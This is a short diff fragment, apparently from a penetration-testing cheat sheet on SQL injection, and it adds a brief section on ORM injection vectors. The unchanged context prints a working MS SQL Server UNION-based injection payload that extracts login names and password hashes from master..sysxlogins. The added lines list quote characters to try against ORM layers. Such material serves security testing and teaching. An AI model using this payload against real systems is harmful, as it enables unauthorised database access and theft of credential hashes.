@@ -223,3 +223,9 @@ system_user*
 
     Get hashes
     *1002' UNION ALL SELECT NULL,CHAR(113)+ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32))+CHAR(98)+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS NVARCHAR(4000)),CHAR(32))+CHAR(113),NULL,NULL FROM master..sysxlogins--*
+
+
+Object to relational mapping (ORM) injection
+    Try vectors like
+    *\'
+\"*
